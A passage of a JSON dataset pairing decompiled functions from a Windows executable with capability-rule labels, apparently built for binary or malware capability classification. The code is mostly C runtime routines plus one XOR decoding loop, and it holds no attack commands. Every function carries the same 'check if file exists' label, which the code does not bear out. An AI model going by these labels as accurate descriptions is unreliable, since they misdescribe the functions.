}\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_02, noname_2_03, noname_2_04, noname_2_05, noname_2_06, \n                                  noname_2_07, noname_2_08, unaff_EDI, unaff_ESI, unaff_EBX, unaff_EBP);\n            noname_2_01 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_01, noname_2_02, noname_2_03, noname_2_04, noname_2_05, \n                                  noname_2_06, noname_2_07, noname_2_08, unaff_EDI, unaff_ESI, unaff_EBX);\n            noname_2_00 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_00, noname_2_01, noname_2_02, noname_2_03, noname_2_04, \n                                  noname_2_05, noname_2_06, noname_2_07, noname_2_08, unaff_EDI, unaff_ESI);\n            noname_2 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2, noname_2_00, noname_2_01, noname_2_02, noname_2_03, \n                                  noname_2_04, noname_2_05, noname_2_06, noname_2_07, noname_2_08, unaff_EDI);\n            fcn.004011fe(10);\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            uVar4 = fcn.0040b610(param_1);\n            *(param_2 + uVar3) = *(param_2 + uVar3) ^ *(param_1 + (uVar3 % uVar4) * 2);\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != param_3);\n    }\n    return;\n}\n",
        "token_count": 3540
    },
    "00409466": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t __cdecl fcn.00409466(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040c020();\n    fcn.0040a224(0);\n    iVar1 = *0x442728;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = iVar1;\n    uVar2 = fcn.00408e33();\n    iVar3 = fcn.0040a323(uVar2);\n    if ((iVar3 == 0) && (iVar3 = iVar1,  iVar1 == 0)) {\n        iVar3 = fcn.00409141(unaff_EBP + -0x10);\n        if (iVar3 == -1) {\n            fcn.0040c1c6(\"bad cast\");\n            fcn.0040b5d6(unaff_EBP + -0x20, 0x43f058);\n        }\n        iVar3 = *(unaff_EBP + -0x10);\n        *0x442728 = iVar3;\n        fcn.004084fc();\n        fcn.0040a39b();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040a247();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar3;\n}\n",
        "token_count": 398
    },
    "00409aab": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00409aab(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    if (param_2 == -1) {\n        fcn.00408d91();\n    }\n    cVar1 = fcn.00401145(param_2, 0);\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x18) < 0x10) {\n            iVar2 = param_1 + 4;\n        }\n        else {\n            iVar2 = *(param_1 + 4);\n        }\n        fcn.00408dee(iVar2, param_2, unaff_retaddr);\n        fcn.004011e5(param_2);\n    }\n    return param_1;\n}\n",
        "token_count": 190
    },
    "0040b37d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b37d(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t *arg_14h, uint32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h;\n    var_4h = *(arg_8h + 0xc);\n    iVar2 = *(arg_8h + 0x10);\n    uVar4 = var_4h;\n    arg_8h = var_4h;\n    if (-1 < arg_ch) {\n        do {\n            if (uVar4 == 0xffffffff) {\n                fcn.0040f591();\n            }\n            uVar4 = uVar4 - 1;\n            iVar1 = iVar2 + uVar4 * 0x14;\n            if (((*(iVar1 + 4) < arg_10h) && (arg_10h <= *(iVar1 + 8))) || (uVar4 == 0xffffffff)) {\n                arg_ch = arg_ch + -1;\n                var_4h = arg_8h;\n                arg_8h = uVar4;\n            }\n        } while (-1 < arg_ch);\n    }\n    uVar4 = uVar4 + 1;\n    *arg_14h = uVar4;\n    *arg_18h = var_4h;\n    if ((*(iVar3 + 0xc) <= var_4h && var_4h != *(iVar3 + 0xc)) || (var_4h < uVar4)) {\n        fcn.0040f591();\n    }\n    return iVar2 + uVar4 * 0x14;\n}\n",
        "token_count": 406
    },
    "0040b685": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b685(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    \n    while( true ) {\n        iVar3 = fcn.0040f847(*arg_8h, 8);\n        if (iVar3 == 0) break;\n        arg_8h = arg_8h + 1;\n    }\n    iVar1 = *arg_8h;\n    piVar5 = arg_8h + 1;\n    if ((iVar1 == 0x2d) || (iVar2 = iVar1,  iVar1 == 0x2b)) {\n        iVar2 = *piVar5;\n        piVar5 = arg_8h + 2;\n    }\n    iVar3 = 0;\n    while( true ) {\n        iVar4 = fcn.0040f67a(iVar2);\n        if (iVar4 == -1) break;\n        iVar3 = iVar4 + iVar3 * 10;\n        iVar2 = *piVar5;\n        piVar5 = piVar5 + 1;\n    }\n    if (iVar1 == 0x2d) {\n        iVar3 = -iVar3;\n    }\n    return iVar3;\n}\n",
        "token_count": 297
    },
    "0040b68a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0040b68a(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int64_t iVar5;\n    int32_t var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        iVar3 = fcn.0040f847(*arg_8h, 8);\n        if (iVar3 == 0) break;\n        arg_8h = arg_8h + 1;\n    }\n    iVar1 = *arg_8h;\n    piVar4 = arg_8h + 1;\n    if ((iVar1 == 0x2d) || (iVar2 = iVar1,  iVar1 == 0x2b)) {\n        iVar2 = *piVar4;\n        piVar4 = arg_8h + 2;\n    }\n    iVar5 = 0;\n    while( true ) {\n        var_8h = iVar5 >> 0x20;\n        iVar3 = fcn.0040f67a(iVar2);\n        if (iVar3 == -1) break;\n        iVar5 = fcn.0040f8a0();\n        iVar5 = iVar5 + iVar3;\n        iVar2 = *piVar4;\n        piVar4 = piVar4 + 1;\n    }\n    if (iVar1 == 0x2d) {\n        iVar5 = CONCAT44(-(var_8h + (iVar5 != 0)), -iVar5);\n    }\n    return iVar5;\n}\n",
        "token_count": 354
    },
    "0040c3ba": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c3ba(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43afc0, 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    iVar5 = *(iVar1 + 8);\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar2 = fcn.0040f262();\n    *(iVar2 + 0x84) = *(iVar2 + 0x84) + 1;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *(unaff_EBP + 0x10);\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar2 + 4) <= iVar5)) {\n            fcn.0040f591();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar2 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar1 + 8) = iVar5;\n            fcn.0040f5c0(*(*(iVar2 + 8) + 4 + iVar3), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040c46d();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040f591();\n    }\n    *(iVar1 + 8) = iVar5;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 539
    },
    "0040cc9b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040cc9b(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    var_1ch = *(arg_ch + 8);\n    _auStack8 = auStack8;\n    if ((var_1ch < -1) || (*(arg_18h + 4) <= var_1ch)) {\n        fcn.0040f591();\n    }\n    if (*arg_8h == -0x1f928c9d) {\n        if ((arg_8h[4] == 3) && (((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)) && (arg_8h[7] == 0)))) {\n            iVar2 = fcn.0040f262();\n            if (*(iVar2 + 0x7c) == 0) {\n                return;\n            }\n            iVar2 = fcn.0040f262();\n            arg_8h = *(iVar2 + 0x7c);\n            iVar2 = fcn.0040f262();\n            arg_10h = *(iVar2 + 0x80);\n            _auStack8 = CONCAT13(1, auStack8);\n            iVar2 = fcn.00411fc8(arg_8h, 1);\n            if (iVar2 == 0) {\n                fcn.0040f591();\n            }\n            if (*arg_8h != -0x1f928c9d) goto code_r0x0040ce74;\n            if (((arg_8h[4] == 3) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)))) && (arg_8h[7] == 0)) {\n                fcn.0040f591();\n            }\n        }\n        iVar2 = var_1ch;\n        if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521))))\n        {\n            piVar3 = fcn.0040b37d(arg_18h, arg_20h, var_1ch, &var_ch, &var_20h);\n            var_8h = piVar3;\n            if (var_ch < var_20h) {\n                do {\n                    if ((*piVar3 == iVar2 || *piVar3 < iVar2) && (iVar2 <= piVar3[1])) {\n                        var_8h = piVar3;\n                        for (var_18h = piVar3[3]; 0 < var_18h; var_18h = var_18h + -1) {\n                            var_10h = *(arg_8h[7] + 0xc);\n                            for (var_14h = *var_10h; var_10h = var_10h + 1,  0 < var_14h; var_14h = var_14h + -1) {\n                                iVar2 = fcn.0040c34d(arg_8h[7]);\n                                piVar3 = var_8h;\n                                if (iVar2 != 0) {\n                                    fcn.0040cb76(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n                                    goto code_r0x0040ce47;\n                                }\n                            }\n                        }\n                    }\ncode_r0x0040ce47:\n                    var_ch = var_ch + 1;\n                    piVar3 = piVar3 + 5;\n                    iVar2 = var_1ch;\n                    var_8h = piVar3;\n                } while (var_ch < var_20h);\n            }\n            if (arg_1ch == '\\0') {\n                return;\n            }\n            fcn.0040c4b8(arg_8h);\n            return;\n        }\n    }\ncode_r0x0040ce74:\n    if (arg_1ch == '\\0') {\n        fcn.0040cbdd(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, var_1ch, arg_20h, arg_24h);\n        return;\n    }\n    fcn.0040f0bc(0x43b8a8, 8);\n    iVar2 = fcn.0040f262();\n    if (*(iVar2 + 0x6c) != 0) {\n        _auStack8 = 0;\n        iVar2 = fcn.0040f262();\n        (**(iVar2 + 0x6c))();\n        _auStack8 = 0xffffffff;\n    }\n    fcn.00411389(10);\n    fcn.00415f05(0x16);\n    fcn.0041135a(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1296
    },
    "0040d2bb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040d2bb(uint32_t param_1, char **param_2)\n\n{\n    char *pcVar1;\n    \n    if (param_1 != 0xffffffff) {\n        pcVar1 = param_2[3];\n        if (((pcVar1 & 1) != 0) || ((pcVar1 < '\\0' && ((pcVar1 & 2) == 0)))) {\n            if (param_2[2] == NULL) {\n                fcn.00412378(param_2);\n            }\n            if (*param_2 == param_2[2]) {\n                if (param_2[1] != NULL) {\n                    return 0xffffffff;\n                }\n                *param_2 = *param_2 + 1;\n            }\n            *param_2 = *param_2 + -1;\n            pcVar1 = *param_2;\n            if ((*(param_2 + 3) & 0x40) == 0) {\n                *pcVar1 = param_1;\n            }\n            else if (*pcVar1 != param_1) {\n                *param_2 = pcVar1 + 1;\n                return 0xffffffff;\n            }\n            param_2[1] = param_2[1] + 1;\n            param_2[3] = param_2[3] & 0xffffffef | 1;\n            return param_1 & 0xff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 325
    },
    "0040d40c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d40c(char *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_10h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch * arg_10h;\n    if (uVar3 == 0) {\n        arg_10h = 0;\n    }\n    else {\n        uVar2 = uVar3;\n        if ((*(arg_14h + 3) & 0x10c) == 0) {\n            var_4h = 0x1000;\n        }\n        else {\n            var_4h = arg_14h[6];\n        }\n        do {\n            if (((arg_14h[3] & 0x108U) == 0) || (uVar4 = arg_14h[1],  uVar4 == 0)) {\n                if (var_4h <= uVar2) {\n                    if (((arg_14h[3] & 0x108U) != 0) && (iVar1 = fcn.0040d102(arg_14h),  iVar1 != 0)) {\ncode_r0x0040d501:\n                        return (uVar3 - uVar2) / arg_ch;\n                    }\n                    uVar4 = uVar2;\n                    if (var_4h != 0) {\n                        uVar4 = uVar2 - uVar2 % var_4h;\n                    }\n                    arg_10h_00 = fcn.00412211(arg_14h[4], arg_8h, uVar4);\n                    if ((arg_10h_00 == 0xffffffff) || (uVar2 = uVar2 - arg_10h_00,  arg_10h_00 < uVar4)) {\n                        arg_14h[3] = arg_14h[3] | 0x20;\n                        goto code_r0x0040d501;\n                    }\n                    goto code_r0x0040d4c1;\n                }\n                iVar1 = fcn.0041249d(*arg_8h, arg_14h);\n                if (iVar1 == -1) goto code_r0x0040d501;\n                arg_8h = arg_8h + 1;\n                var_4h = arg_14h[6];\n                uVar2 = uVar2 - 1;\n                if (var_4h < 1) {\n                    var_4h = 1;\n                }\n            }\n            else {\n                arg_10h_00 = uVar2;\n                if (uVar4 <= uVar2) {\n                    arg_10h_00 = uVar4;\n                }\n                fcn.0040bce0(*arg_14h, arg_8h, arg_10h_00);\n                arg_14h[1] = arg_14h[1] - arg_10h_00;\n                *arg_14h = *arg_14h + arg_10h_00;\n                uVar2 = uVar2 - arg_10h_00;\ncode_r0x0040d4c1:\n                arg_8h = arg_8h + arg_10h_00;\n            }\n        } while (uVar2 != 0);\n    }\n    return arg_10h;\n}\n",
        "token_count": 788
    },
    "0040d670": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0040d670(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (((*(param_1 + 0xc) & 0x83) == 0) || (((param_3 != 0 && (param_3 != 1)) && (param_3 != 2)))) {\n        puVar3 = fcn.0041296c();\n        *puVar3 = 0x16;\n        iVar2 = -1;\n    }\n    else {\n        *(param_1 + 0xc) = *(param_1 + 0xc) & 0xffffffef;\n        if (param_3 == 1) {\n            iVar2 = fcn.00412b10(param_1);\n            param_2 = param_2 + iVar2;\n            param_3 = 0;\n        }\n        fcn.0040d102(param_1);\n        uVar1 = *(param_1 + 0xc);\n        if (uVar1 < '\\0') {\n            *(param_1 + 0xc) = uVar1 & 0xfffffffc;\n        }\n        else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {\n            *(param_1 + 0x18) = 0x200;\n        }\n        iVar2 = fcn.00412a65(*(param_1 + 0x10), param_2, param_3);\n        iVar2 = (iVar2 != -1) - 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 389
    },
    "0040e63a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_38h_2\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: lpSrcStr\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.0040e63a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint CodePage, uint arg_24h, uint arg_8h, \n            uint arg_ch, uint arg_10h, uint cchSrc, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *lpMultiByteStr_00;\n    int32_t unaff_EBP;\n    uchar *arg_8h_00;\n    uint var_2ch;\n    uint var_48h;\n    uint var_24h_2;\n    uint var_40h;\n    uint lpWideCharStr;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_20h_2;\n    uint var_24h_3;\n    uint var_28h;\n    uint var_24h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpMultiByteStr;\n    uint cbMultiByte;\n    uint var_18h_2;\n    uint var_4h;\n    uint uVar5;\n    uint uVar6;\n    uint var_38h_2;\n    uint var_34h;\n    uint var_30h_2;\n    uint var_20h;\n    uint lpSrcStr;\n    uint var_44h;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h;\n    \n    fcn.0040f0bc();\n    if (*0x4428ec == 0) {\n        lpSrcStr = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x4428ec = 2;\n            }\n        }\n        else {\n            *0x4428ec = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        pcVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*pcVar2 == '\\0') goto code_r0x0040e6a0;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x0040e6a0:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if ((*0x4428ec != 2) && (*0x4428ec != 0)) {\n        if (*0x4428ec != 1) goto code_r0x0040e9ed;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        if (*(unaff_EBP + 0x20) == 0) {\n            *(unaff_EBP + 0x20) = *0x442c00;\n        }\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x30) = iVar1;\n        if (iVar1 == 0) goto code_r0x0040e9ed;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040fc80();\n        *(unaff_EBP + -0x18) = &fcn.0040e63a::lpSrcStr;\n        *(unaff_EBP + -0x1c) = &fcn.0040e63a::lpSrcStr;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x1c) == 0) {\n            iVar3 = fcn.0040b8de();\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) goto code_r0x0040e9ed;\n            *(unaff_EBP + -0x38) = 1;\n        }\n        var_30h_2 = 1;\n        var_34h = *(unaff_EBP + 0x20);\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, 0, 0);\n            *(unaff_EBP + -0x2c) = iVar3;\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    *(unaff_EBP + -4) = 2;\n                    fcn.0040fc80();\n                    *(unaff_EBP + -0x18) = &fcn.0040e63a::var_34h;\n                    *(unaff_EBP + -0x20) = &fcn.0040e63a::var_34h;\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        iVar4 = fcn.0040b8de(iVar3 * 2);\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) goto code_r0x0040e86f;\n                        *(unaff_EBP + -0x34) = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                                      (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, \n                                       *(unaff_EBP + -0x20), iVar3);\n                    if (iVar1 != 0) {\n                        if (*(unaff_EBP + 0x1c) == 0) {\n                            uVar6 = 0;\n                            uVar5 = 0;\n                        }\n                        else {\n                            uVar6 = *(unaff_EBP + 0x1c);\n                            uVar5 = *(unaff_EBP + 0x18);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x20), 0, *(unaff_EBP + -0x20), iVar3, uVar5, uVar6, 0, 0);\n                    }\n                }\n                else if ((*(unaff_EBP + 0x1c) != 0) && (iVar3 <= *(unaff_EBP + 0x1c))) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c));\n                }\n            }\n        }\ncode_r0x0040e86f:\n        if (*(unaff_EBP + -0x34) != 0) {\n            fcn.0040cfb5(*(unaff_EBP + -0x20));\n        }\n        if (*(unaff_EBP + -0x38) != 0) {\n            fcn.0040cfb5(*(unaff_EBP + -0x1c));\n        }\n        goto code_r0x0040e9ed;\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x442bf0;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x442c00;\n    }\n    iVar1 = fcn.00415600(*(unaff_EBP + 8));\n    *(unaff_EBP + -0x40) = iVar1;\n    if (iVar1 == -1) goto code_r0x0040e9ed;\n    if (iVar1 == *(unaff_EBP + 0x20)) {\n        lpSrcStr = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n    }\n    else {\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = fcn.00415643(lpSrcStr, iVar1, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x43b310, 0x38);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) goto code_r0x0040e9ed;\n        uVar6 = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        lpMultiByteStr_00 = &fcn.0040e63a::lpSrcStr;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        *(unaff_EBP + -0x24) = iVar1;\n        arg_8h_00 = NULL;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040fc80();\n            *(unaff_EBP + -0x18) = &fcn.0040e63a::lpSrcStr;\n            *(unaff_EBP + -0x44) = &fcn.0040e63a::lpSrcStr;\n            fcn.0040cf50();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                lpMultiByteStr_00 = fcn.0040b8de();\n                arg_8h_00 = lpMultiByteStr_00;\n                if (lpMultiByteStr_00 == NULL) goto code_r0x0040e9b5;\n                fcn.0040cf50();\n                *(unaff_EBP + -0x3c) = 1;\n            }\n            var_30h_2 = *(unaff_EBP + 0xc);\n            var_34h = *(unaff_EBP + 8);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            *(unaff_EBP + -0x24) = iVar1;\n            arg_8h_00 = lpMultiByteStr_00;\n            if (iVar1 != 0) {\n                var_30h_2 = *(unaff_EBP + 0x20);\n                var_34h = *(unaff_EBP + -0x40);\n                fcn.00415643(var_34h, var_30h_2, lpMultiByteStr_00, unaff_EBP + -0x24, *(unaff_EBP + 0x18), \n                             *(unaff_EBP + 0x1c), lpSrcStr, uVar6);\n            }\n        }\ncode_r0x0040e9b5:\n        if (*(unaff_EBP + -0x3c) != 0) {\n            fcn.0040cfb5(arg_8h_00);\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.0040cfb5(*(unaff_EBP + -0x28));\n    }\ncode_r0x0040e9ed:\n    *(unaff_EBP + -0x58) = 0x40e9f5;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 3056
    },
    "0040f110": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
